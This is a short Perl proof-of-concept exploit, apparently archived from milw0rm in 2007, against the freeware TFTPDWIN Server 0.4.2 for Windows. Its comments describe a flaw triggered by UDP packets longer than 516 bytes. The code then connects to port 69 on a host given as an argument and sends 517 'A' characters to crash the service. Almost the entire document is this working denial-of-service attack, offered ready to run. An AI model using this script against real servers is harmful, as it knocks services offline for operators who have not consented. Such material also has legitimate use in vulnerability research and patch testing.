#!/usr/bin/perl
#
#                            TFTPDWIN Server UDP DOS 0.4.2 POC 
#			            written By : Umesh Wanve (umesh_345@yahoo.com)
#	
#-------------------------------------------------------------------------------

# TFTPDWIN Server is a Freeware TFTP server for Windows 9x/NT/XP.
# (http://www.tftpserver.prosysinfo.com.pl)
# A vulnerability has been identified in TFTP Server TFTPDWIN Server v0.4.2, which 
# could be exploited by remote or local attackers to execute arbitrary commands 
# or cause a denial of service. This flaw is when attacker sends UDP packet of length more than 516 bytes

#

#----------------------------Start of Code-------------------------------------



use IO::Socket;
use strict;

my($socket) = "";

if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],

PeerPort => "69",

Proto    => "UDP"))
{
                
                 print $socket "A" x 517;
                 sleep(1);
			
                
                 close($socket);
}
else
{
                 print "Cannot connect to $ARGV[0]:69\n";
}

# milw0rm.com [2007-03-08]
